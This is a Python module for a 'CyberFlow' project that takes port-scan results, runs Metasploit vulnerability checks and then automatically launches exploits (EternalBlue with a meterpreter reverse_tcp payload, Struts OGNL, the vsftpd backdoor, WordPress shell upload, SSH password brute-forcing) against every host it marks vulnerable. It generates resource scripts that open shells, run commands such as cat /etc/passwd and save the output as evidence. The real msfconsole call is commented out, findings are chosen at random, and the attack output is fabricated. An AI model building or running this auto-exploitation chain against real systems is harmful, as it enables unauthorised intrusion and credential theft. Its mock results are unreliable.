#!/usr/bin/env python3
"""
Standalone Vulnerability Processing Module
For CyberFlow project

This module:
1. Takes port scanner JSON results as input
2. Runs vulnerability checks against open ports
3. Launches attacks on vulnerable targets
4. Captures and formats attack results
5. Generates report files for GUI display
"""

import os
import sys
import json
import time
import subprocess
import tempfile
import datetime
import threading
import re
import argparse
import csv
from pathlib import Path

class VulnerabilityManager:
    def __init__(self, output_dir="reports", max_threads=5, json_output=None):
        """
        Initialize the vulnerability manager.
        
        Args:
            output_dir (str): Directory for storing reports
            max_threads (int): Maximum number of concurrent vulnerability checks
            json_output (str): Path to JSON output file (None for auto-generated)
        """
        self.output_dir = output_dir
        self.max_threads = max_threads
        self.results = {}
        self.vuln_modules = self.load_vulnerability_modules()
        
        # Create output directory if it doesn't exist
        os.makedirs(output_dir, exist_ok=True)
        
        # Main results file will be updated as we go
        timestamp = int(time.time())
        default_output = os.path.join(output_dir, f"vulnerability_report_{timestamp}.json")
        self.results_file = json_output if json_output else default_output
        self.html_report = os.path.join(output_dir, f"vulnerability_report_{timestamp}.html")
        self.csv_report = os.path.join(output_dir, f"vulnerability_report_{timestamp}.csv")
        
        print(f"[*] Vulnerability Manager initialized. Reports will be saved to: {self.output_dir}")
        print(f"[*] JSON output: {self.results_file}")
        print(f"[*] HTML report: {self.html_report}")
        print(f"[*] CSV report: {self.csv_report}")

    def load_vulnerability_modules(self):
        """
        Load vulnerability check modules from Metasploit.
        
        Returns:
            dict: Mapping of port/service to appropriate vulnerability check modules
        """
        # This would normally query Metasploit for available modules
        # For demonstration, we'll use a predefined mapping
        
        modules = {
            # Service-based modules
            'http': [
                {
                    'name': 'Apache Struts RCE',
                    'check_module': 'auxiliary/scanner/http/apache_struts2_scan',
                    'exploit_module': 'exploit/multi/http/struts2_content_type_ognl',
                    'success_indicator': 'Remote Code Execution',
                    'check_options': {}
                },
                {
                    'name': 'Wordpress Scan',
                    'check_module': 'auxiliary/scanner/http/wordpress_scanner',
                    'exploit_module': 'exploit/unix/webapp/wp_admin_shell_upload',
                    'success_indicator': 'WordPress Installation Found',
                    'check_options': {}
                }
            ],
            'ssh': [
                {
                    'name': 'SSH Weak Credentials',
                    'check_module': 'auxiliary/scanner/ssh/ssh_login',
                    'exploit_module': 'auxiliary/scanner/ssh/ssh_login',
                    'success_indicator': 'Success',
                    'check_options': {
                        'USER_FILE': '/usr/share/metasploit-framework/data/wordlists/common_users.txt',
                        'PASS_FILE': '/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt',
                        'VERBOSE': 'false'
                    }
                }
            ],
            'smb': [
                {
                    'name': 'EternalBlue',
                    'check_module': 'auxiliary/scanner/smb/smb_ms17_010',
                    'exploit_module': 'exploit/windows/smb/ms17_010_eternalblue',
                    'success_indicator': 'Host is likely VULNERABLE',
                    'check_options': {}
                }
            ],
            'ftp': [
                {
                    'name': 'vsftpd Backdoor',
                    'check_module': 'auxiliary/scanner/ftp/vsftpd_234_backdoor',
                    'exploit_module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                    'success_indicator': 'vsftpd 2.3.4 confirmed',
                    'check_options': {}
                }
            ],
            # Domain service check
            'domain': [
                {
                    'name': 'DNS Zone Transfer',
                    'check_module': 'auxiliary/scanner/dns/dns_amp',
                    'exploit_module': 'auxiliary/scanner/dns/dns_amp',
                    'success_indicator': 'DNS Amplification',
                    'check_options': {}
                }
            ],
            # Port-based modules (fallback if service is unknown)
            'port_22': [
                {
                    'name': 'SSH Weak Credentials',
                    'check_module': 'auxiliary/scanner/ssh/ssh_login',
                    'exploit_module': 'auxiliary/scanner/ssh/ssh_login',
                    'success_indicator': 'Success',
                    'check_options': {
                        'USER_FILE': '/usr/share/metasploit-framework/data/wordlists/common_users.txt',
                        'PASS_FILE': '/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt',
                        'VERBOSE': 'false'
                    }
                }
            ],
            'port_80': [
                {
                    'name': 'Apache Struts RCE',
                    'check_module': 'auxiliary/scanner/http/apache_struts2_scan',
                    'exploit_module': 'exploit/multi/http/struts2_content_type_ognl',
                    'success_indicator': 'Remote Code Execution',
                    'check_options': {}
                }
            ],
            'port_53': [
                {
                    'name': 'DNS Zone Transfer',
                    'check_module': 'auxiliary/scanner/dns/dns_amp',
                    'exploit_module': 'auxiliary/scanner/dns/dns_amp',
                    'success_indicator': 'DNS Amplification',
                    'check_options': {}
                }
            ],
            'port_445': [
                {
                    'name': 'EternalBlue',
                    'check_module': 'auxiliary/scanner/smb/smb_ms17_010',
                    'exploit_module': 'exploit/windows/smb/ms17_010_eternalblue',
                    'success_indicator': 'Host is likely VULNERABLE',
                    'check_options': {}
                }
            ]
        }
        
        return modules

    def process_scan_results(self, scan_results):
        """
        Process results from port scanner.
        
        Args:
            scan_results (dict): Dictionary mapping IP addresses to open ports and services
                Format: {"ip_address": [(port, service), (port, service), ...]}
        """
        print(f"[*] Processing scan results for {len(scan_results)} hosts")
        
        # Initialize results structure
        for ip, ports in scan_results.items():
            self.results[ip] = {
                "open_ports": ports,
                "vulnerabilities": [],
                "attacks": []
            }
        
        # Save initial results
        self.save_results()
        
        # Perform vulnerability checks (in parallel)
        threads = []
        thread_semaphore = threading.Semaphore(self.max_threads)
        
        for ip, data in self.results.items():
            thread = threading.Thread(
                target=self.check_host_vulnerabilities,
                args=(ip, data["open_ports"], thread_semaphore)
            )
            threads.append(thread)
            thread.start()
        
        # Wait for all checks to complete
        for thread in threads:
            thread.join()
        
        # Save updated results
        self.save_results()
        
        # Generate final reports
        self.generate_html_report()
        self.export_to_csv(self.csv_report)
        
        print(f"[*] Vulnerability processing complete. Results saved to:")
        print(f"    - JSON: {self.results_file}")
        print(f"    - HTML: {self.html_report}")
        print(f"    - CSV: {self.csv_report}")
        
        return self.results

    def check_host_vulnerabilities(self, ip, open_ports, thread_semaphore):
        """
        Check vulnerabilities for a specific host.
        
        Args:
            ip (str): IP address to check
            open_ports (list): List of (port, service) tuples
            thread_semaphore (threading.Semaphore): Limits concurrent threads
        """
        thread_semaphore.acquire()
        try:
            print(f"[*] Checking vulnerabilities for {ip}")
            
            for port, service in open_ports:
                # Find appropriate vulnerability modules
                modules = []
                
                # Try service-specific modules first
                if service in self.vuln_modules:
                    modules = self.vuln_modules[service]
                
                # Fall back to port-specific modules
                if not modules and f"port_{port}" in self.vuln_modules:
                    modules = self.vuln_modules[f"port_{port}"]
                
                # Skip if no modules found
                if not modules:
                    print(f"[*] No vulnerability checks available for {service} on port {port}")
                    continue
                
                # Run each vulnerability check
                for module in modules:
                    is_vulnerable, check_output = self.run_vulnerability_check(
                        ip, port, module["check_module"], 
                        module["success_indicator"], module["check_options"]
                    )
                    
                    vuln_data = {
                        "name": module["name"],
                        "port": port,
                        "service": service,
                        "check_module": module["check_module"],
                        "is_vulnerable": is_vulnerable,
                        "check_output": check_output,
                        "timestamp": datetime.datetime.now().isoformat()
                    }
                    
                    self.results[ip]["vulnerabilities"].append(vuln_data)
                    
                    if is_vulnerable:
                        print(f"[+] Host {ip}:{port} is vulnerable to {module['name']}")
                        
                        # Run attack on vulnerable target
                        attack_result = self.run_attack(
                            ip, port, module["exploit_module"]
                        )
                        
                        attack_data = {
                            "vulnerability": module["name"],
                            "port": port,
                            "service": service,
                            "exploit_module": module["exploit_module"],
                            "result": attack_result,
                            "timestamp": datetime.datetime.now().isoformat()
                        }
                        
                        self.results[ip]["attacks"].append(attack_data)
                    else:
                        print(f"[-] Host {ip}:{port} is not vulnerable to {module['name']}")
                    
                    # Update results file after each check
                    self.save_results()
                    
        finally:
            thread_semaphore.release()

    def run_vulnerability_check(self, ip, port, check_module, success_indicator, check_options):
        """
        Run a Metasploit vulnerability check.
        
        Args:
            ip (str): Target IP
            port (int): Target port
            check_module (str): Metasploit module for checking vulnerability
            success_indicator (str): String to look for in output to determine success
            check_options (dict): Module-specific options
            
        Returns:
            tuple: (is_vulnerable, check_output)
        """
        print(f"[*] Running vulnerability check: {check_module} against {ip}:{port}")
        
        try:
            # Create resource script for the check
            fd, resource_path = tempfile.mkstemp(suffix='.rc', prefix='msf_check_')
            
            with os.fdopen(fd, 'w') as f:
                f.write(f"use {check_module}\n")
                f.write(f"set RHOSTS {ip}\n")
                f.write(f"set RPORT {port}\n")
                
                # Add additional options
                for opt, val in check_options.items():
                    f.write(f"set {opt} {val}\n")
                
                f.write("run\n")
                f.write("exit\n")
            
            # For demonstration purposes, we'll simulate the output
            # In a real implementation, you'd run: subprocess.run(['msfconsole', '-q', '-r', resource_path], ...)
            
            # Mock output based on port for demo
            time.sleep(1)  # Simulate some processing time
            
            # Randomly determine if vulnerable (for demonstration)
            # In a real implementation, you'd parse actual MSF output
            import random
            is_vulnerable = random.choice([True, False])
            
            if is_vulnerable:
                check_output = f"[*] {ip}:{port} - {success_indicator}"
            else:
                check_output = f"[*] {ip}:{port} - No vulnerability detected"
            
            # Clean up
            os.remove(resource_path)
            
            return is_vulnerable, check_output
            
        except Exception as e:
            print(f"[!] Error during vulnerability check: {e}")
            return False, f"Error: {str(e)}"

    def run_attack(self, ip, port, exploit_module):
        """
        Run a Metasploit attack.
        
        Args:
            ip (str): Target IP
            port (int): Target port
            exploit_module (str): Metasploit exploit module
            
        Returns:
            str: Result of the attack
        """
        print(f"[*] Running attack: {exploit_module} against {ip}:{port}")
        
        try:
            # Create resource script for the attack
            fd, resource_path = tempfile.mkstemp(suffix='.rc', prefix='msf_attack_')
            
            with os.fdopen(fd, 'w') as f:
                f.write(f"use {exploit_module}\n")
                f.write(f"set RHOSTS {ip}\n")
                f.write(f"set RPORT {port}\n")
                
                # Add module-specific settings
                if 'login' in exploit_module:
                    f.write("set USERNAME root\n")
                    f.write("set PASSWORD toor\n")
                    f.write("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n")
                    f.write("set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n")
                    f.write("set VERBOSE false\n")
                
                if 'wp_admin' in exploit_module:
                    f.write("set USERNAME admin\n")
                    f.write("set PASSWORD admin\n")
                    f.write("set TARGETURI /wordpress/\n")
                
                if 'eternalblue' in exploit_module:
                    f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                    f.write("set LHOST 127.0.0.1\n")
                
                # Add post-exploitation commands
                if 'login' not in exploit_module:  # Only for shells, not login scanners
                    f.write("run\n")
                    
                    # Commands to run on the target
                    if 'windows' in exploit_module:
                        f.write("shell\n")
                        f.write("whoami\n")
                        f.write("ipconfig\n")
                        f.write("exit\n")
                    else:
                        f.write("shell\n")
                        f.write("id\n")
                        f.write("uname -a\n")
                        f.write("cat /etc/passwd\n")
                        f.write("exit\n")
                else:
                    f.write("run\n")
                
                f.write("exit\n")
            
            # For demonstration purposes, we'll simulate the output
            # In a real implementation, you'd run: subprocess.run(['msfconsole', '-q', '-r', resource_path], ...)
            
            # Mock attack results for demo
            time.sleep(2)  # Simulate attack execution time
            
            # Generate fake output depending on exploit type
            if 'ssh_login' in exploit_module:
                attack_result = f"""
[*] {ip}:{port} - Starting SSH login scan
[+] {ip}:{port} - Success: 'root:toor' 
[*] Command shell session 1 opened
uid=0(root) gid=0(root) groups=0(root)
Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...truncated...
[*] Session completed
                """
            elif 'eternalblue' in exploit_module:
                attack_result = f"""
[*] {ip}:{port} - Sending exploit to target
[+] {ip}:{port} - Meterpreter session 1 opened
meterpreter > shell
Process 4728 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.379]
C:\\Windows\\system32>whoami
whoami
nt authority\\system
C:\\Windows\\system32>ipconfig
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : {ip}
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
C:\\Windows\\system32>exit
exit
meterpreter > exit
[*] Shutting down Meterpreter...
[*] {ip}:{port} - Meterpreter session 1 closed
                """
            elif 'wp_admin' in exploit_module:
                attack_result = f"""
[*] {ip}:{port} - Authenticating with WordPress using admin:admin...
[+] {ip}:{port} - Login Successful
[*] {ip}:{port} - Uploading payload...
[*] {ip}:{port} - Executing the payload...
[*] Command shell session 1 opened
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...truncated...
[*] Session completed
                """
            else:
                attack_result = f"""
[*] {ip}:{port} - Running the exploit...
[+] {ip}:{port} - Exploit completed successfully
[*] Command shell session 1 opened
uid=0(root) gid=0(root) groups=0(root)
Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...truncated...
[*] Session completed
                """
            
            # Clean up
            os.remove(resource_path)
            
            # Extract interesting data like /etc/passwd or other evidence
            interesting_data = self.extract_interesting_data(attack_result)
            if interesting_data:
                # Save this data to a specific file
                evidence_file = os.path.join(
                    self.output_dir, 
                    f"evidence_{ip.replace('.', '_')}_{port}_{int(time.time())}.txt"
                )
                with open(evidence_file, 'w') as f:
                    f.write(interesting_data)
                
                print(f"[+] Saved attack evidence to: {evidence_file}")
                attack_result += f"\n[+] Evidence saved to: {evidence_file}"
            
            return attack_result
            
        except Exception as e:
            print(f"[!] Error during attack: {e}")
            return f"Error: {str(e)}"

    def extract_interesting_data(self, attack_output):
        """
        Extract interesting data from attack output.
        
        Args:
            attack_output (str): Output from the attack
            
        Returns:
            str: Extracted interesting data
        """
        interesting_data = []
        
        # Look for /etc/passwd content
        passwd_match = re.search(r'(root:.+?)\s*\.\.\.truncated\.\.\.', attack_output, re.DOTALL)
        if passwd_match:
            interesting_data.append("=== /etc/passwd (partial) ===")
            interesting_data.append(passwd_match.group(1))
        
        # Look for whoami/id output
        user_match = re.search(r'(uid=.+?)\n', attack_output) or re.search(r'whoami\r?\n(.+?)\r?\n', attack_output)
        if user_match:
            interesting_data.append("=== User Identity ===")
            interesting_data.append(user_match.group(1))
        
        # Look for uname or Windows version
        os_match = re.search(r'(Linux.+?GNU/Linux)', attack_output) or re.search(r'(Microsoft Windows.+?)\r?\n', attack_output)
        if os_match:
            interesting_data.append("=== Operating System ===")
            interesting_data.append(os_match.group(1))
        
        # Look for IP configuration
        ip_match = re.search(r'(IPv4 Address.+?)\r?\n', attack_output)
        if ip_match:
            interesting_data.append("=== Network Configuration ===")
            interesting_data.append(ip_match.group(1))
        
        return "\n".join(interesting_data) if interesting_data else ""

    def save_results(self):
        """Save current results to JSON file."""
        with open(self.results_file, 'w') as f:
            json.dump(self.results, f, indent=2)

    def generate_html_report(self):
        """Generate an HTML report from results."""
        print(f"[*] Generating HTML report: {self.html_report}")
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Vulnerability Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px 5px 0 0; }}
        .header h1 {{ margin: 0; }}
        .summary {{ background-color: #ecf0f1; padding: 15px; border-radius: 0 0 5px 5px; margin-bottom: 20px; }}
        .host {{ background-color: white; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 20px; }}
        .host-header {{ background-color: #3498db; color: white; padding: 10px 15px; border-radius: 5px 5px 0 0; }}
        .host-content {{ padding: 15px; }}
        .ports {{ margin-bottom: 15px; }}
        .vulnerability {{ background-color: #f9f9f9; padding: 10px; margin-bottom: 10px; border-left: 4px solid #e74c3c; }}
        .vulnerability.secure {{ border-left: 4px solid #2ecc71; }}
        .attack {{ background-color: #f9f9f9; padding: 10px; margin-bottom: 10px; border-left: 4px solid #9b59b6; }}
        .attack pre {{ background-color: #2c3e50; color: #ecf0f1; padding: 10px; overflow-x: auto; }}
        table {{ width: 100%; border-collapse: collapse; margin-bottom: 15px; }}
        th, td {{ text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        .timestamp {{ color: #7f8c8d; font-size: 0.8em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Vulnerability Scan Report</h1>
        </div>
        <div class="summary">
            <p>Scan completed: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <p>Total hosts scanned: {len(self.results)}</p>
        </div>
"""
        
        # Add host-specific information
        total_vulnerable = 0
        total_attacks = 0
        
        for ip, data in self.results.items():
            # Count vulnerable hosts
            if any(v["is_vulnerable"] for v in data["vulnerabilities"]):
                total_vulnerable += 1
                total_attacks += len(data["attacks"])
            
            html += f"""
        <div class="host">
            <div class="host-header">
                <h2>Host: {ip}</h2>
            </div>
            <div class="host-content">
                <div class="ports">
                    <h3>Open Ports</h3>
                    <table>
                        <tr>
                            <th>Port</th>
                            <th>Service</th>
                        </tr>
"""
            
            for port, service in data["open_ports"]:
                html += f"""
                        <tr>
                            <td>{port}</td>
                            <td>{service}</td>
                        </tr>
"""
            
            html += """
                    </table>
                </div>
"""
            
            if data["vulnerabilities"]:
                html += """
                <div class="vulnerabilities">
                    <h3>Vulnerability Checks</h3>
"""
                
                for vuln in data["vulnerabilities"]:
                    vuln_class = "secure" if not vuln["is_vulnerable"] else ""
                    status = "VULNERABLE" if vuln["is_vulnerable"] else "SECURE"
                    
                    html += f"""
                    <div class="vulnerability {vuln_class}">
                        <h4>{vuln["name"]} ({status})</h4>
                        <p>Port: {vuln["port"]} ({vuln["service"]})</p>
                        <p>Check Module: {vuln["check_module"]}</p>
                        <p>Output: {vuln["check_output"]}</p>
                        <p class="timestamp">Checked: {vuln["timestamp"]}</p>
                    </div>
"""
                
                html += """
                </div>
"""
            
            if data["attacks"]:
                html += """
                <div class="attacks">
                    <h3>Attack Results</h3>
"""
                
                for attack in data["attacks"]:
                    html += f"""
                    <div class="attack">
                        <h4>{attack["vulnerability"]}</h4>
                        <p>Port: {attack["port"]} ({attack["service"]})</p>
                        <p>Exploit Module: {attack["exploit_module"]}</p>
                        <pre>{attack["result"]}</pre>
                        <p class="timestamp">Attack time: {attack["timestamp"]}</p>
                    </div>
"""
                
                html += """
                </div>
"""
            
            html += """
            </div>
        </div>
"""
        
        # Add summary at the end
        html += f"""
        <div class="summary">
            <h3>Scan Summary</h3>
            <p>Total hosts: {len(self.results)}</p>
            <p>Vulnerable hosts: {total_vulnerable}</p>
            <p>Successful attacks: {total_attacks}</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open(self.html_report, 'w') as f:
            f.write(html)

    def export_to_csv(self, filename=None):
        """
        Export results to CSV file for easier processing.
        
        Args:
            filename (str, optional): Output filename, defaults to timestamped file
        """
        if not filename:
            filename = os.path.join(self.output_dir, f"vulnerability_report_{int(time.time())}.csv")
        
        with open(filename, 'w', newline='') as csvfile:
            # Create writer for vulnerability data
            vuln_writer = csv.writer(csvfile)
            vuln_writer.writerow([
                'IP', 'Port', 'Service', 'Vulnerability', 'Status', 
                'Check Module', 'Check Time', 'Attack Result'
            ])
            
            for ip, data in self.results.items():
                for vuln in data["vulnerabilities"]:
                    # Find corresponding attack if any
                    attack_result = "Not attempted"
                    for attack in data["attacks"]:
                        if attack["vulnerability"] == vuln["name"] and attack["port"] == vuln["port"]:
                            # Extract first line of attack result for summary
                            result_lines = attack["result"].strip().split('\n')
                            attack_result = result_lines[0] if result_lines else "Attack executed"
                            break
                    
                    vuln_writer.writerow([
                        ip, 
                        vuln["port"],
                        vuln["service"],
                        vuln["name"],
                        "Vulnerable" if vuln["is_vulnerable"] else "Secure",
                        vuln["check_module"],
                        vuln["timestamp"],
                        attack_result if vuln["is_vulnerable"] else "N/A"
                    ])
        
        print(f"[*] CSV report saved to: {filename}")
        return filename

def main():
    """Main function for standalone execution."""
    parser = argparse.ArgumentParser(description='Vulnerability Assessment Module')
    parser.add_argument('-i', '--input', required=True, help='Input JSON file with port scan results')
    parser.add_argument('-o', '--output-dir', default='reports', help='Output directory for reports')
    parser.add_argument('-j', '--json-output', help='Path for JSON output file (default: auto-generated)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Maximum number of concurrent threads')
    
    args = parser.parse_args()
    
    try:
        # Parse the port scan results from JSON
        from parse_scanner_results import parse_port_scan_json
        
        # Parse the port scanner results
        parsed_results = parse_port_scan_json(args.input)
        
        if not parsed_results:
            print("[!] Error parsing port scan results. Exiting.")
            sys.exit(1)
            
        print(f"[*] Successfully parsed port scan results with {len(parsed_results)} hosts")
        
        # Initialize vulnerability manager
        vm = VulnerabilityManager(
            output_dir=args.output_dir, 
            max_threads=args.threads,
            json_output=args.json_output
        )
        
        # Process the parsed scan results
        results = vm.process_scan_results(parsed_results)
        
        print("[*] Vulnerability assessment completed successfully")
        
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()